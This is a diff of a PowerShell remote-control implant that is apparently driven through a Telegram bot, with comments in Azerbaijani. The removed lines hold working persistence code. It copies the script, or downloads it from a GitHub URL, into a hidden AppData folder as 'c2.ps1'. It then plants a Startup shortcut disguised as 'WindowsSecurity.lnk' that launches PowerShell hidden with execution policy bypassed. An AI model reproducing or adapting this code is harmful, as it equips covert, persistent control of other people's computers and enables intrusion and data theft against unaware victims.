@@ -5,38 +5,7 @@ $apiUrl = "https://api.telegram.org/bot$token"
 $lastUpdateId = 0
 $currentDir = "C:\"
 
-# --- Avtomatik persistence (yalnız ilk dəfə) ---
-$hiddenDir = "$env:APPDATA\Microsoft\Windows\Caches"
-if (-not (Test-Path $hiddenDir)) { New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null }
-$hiddenScript = "$hiddenDir\c2.ps1"
 
-if (-not (Test-Path $hiddenScript)) {
-    $selfPath = $PSCommandPath
-    if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
-    if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Definition }
-    
-    if ($selfPath -and (Test-Path $selfPath)) {
-        Copy-Item -Path $selfPath -Destination $hiddenScript -Force -ErrorAction SilentlyContinue
-    } else {
-        $selfUrl = "https://raw.githubusercontent.com/rirtuh/badusbdemo/refs/heads/main/system.ps1"
-        try {
-            Invoke-WebRequest -Uri $selfUrl -OutFile $hiddenScript -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
-        } catch {}
-    }
-}
-
-$startupFolder = [Environment]::GetFolderPath('Startup')
-$shortcutPath = Join-Path $startupFolder "WindowsSecurity.lnk"
-if (-not (Test-Path $shortcutPath) -and (Test-Path $hiddenScript)) {
-    try {
-        $wshell = New-Object -ComObject WScript.Shell
-        $shortcut = $wshell.CreateShortcut($shortcutPath)
-        $shortcut.TargetPath = "powershell.exe"
-        $shortcut.Arguments = "-W Hidden -NoP -Exec Bypass -File `"$hiddenScript`""
-        $shortcut.WindowStyle = 7
-        $shortcut.Save()
-    } catch {}
-}
 
 # --- Köməkçi: mesaj göndər ---
 function Send-Message($text) {
